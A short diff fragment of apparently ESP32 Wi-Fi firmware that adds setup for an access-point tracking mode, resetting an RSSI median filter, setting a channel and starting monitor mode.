+    rssi_median_reset(&tracking_med);
+    tracking_last_rx_us = 0;
+    ap_tracking_active = true;
+    sta_tracking_active = false;
+    track_any_frame = true;
+
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+
+    status_display_show_status("Track");
     wifi_manager_start_monitor_mode(wifi_track_callback);
 }
 
